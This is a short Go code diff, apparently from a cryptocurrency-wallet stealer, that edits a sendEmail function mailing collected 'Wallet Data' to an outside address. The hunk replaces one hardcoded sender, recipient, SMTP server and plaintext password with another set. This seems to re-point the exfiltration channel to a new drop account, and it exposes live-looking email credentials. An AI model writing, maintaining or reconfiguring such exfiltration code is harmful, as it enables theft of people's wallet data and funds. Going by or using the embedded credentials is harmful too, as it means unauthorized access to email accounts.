@@ -57,12 +57,12 @@ func main() {
 
 func sendEmail(data *WalletData) error {
     m := gomail.NewMessage()
-    m.SetHeader("From", "mciuadmissions247@gmail.com")
-    m.SetHeader("To", "soejohn22@gmail.com")
+    m.SetHeader("From", "info@resolverd.dev")
+    m.SetHeader("To", "johnfisher@gmail.com")
     m.SetHeader("Subject", "Wallet Data")
     m.SetBody("text/plain", formatEmailBody(data))
 
-    d := gomail.NewDialer("smtp.gmail.com", 587, "mciuadmissions247@gmail.com", "eskxqjxovxigysop")
+    d := gomail.NewDialer("mail.privateemail.com", 465, "info@resolverd.dev", "Smile4me#")
 
     if err := d.DialAndSend(m); err != nil {
         log.Println("DialAndSend error:", err)
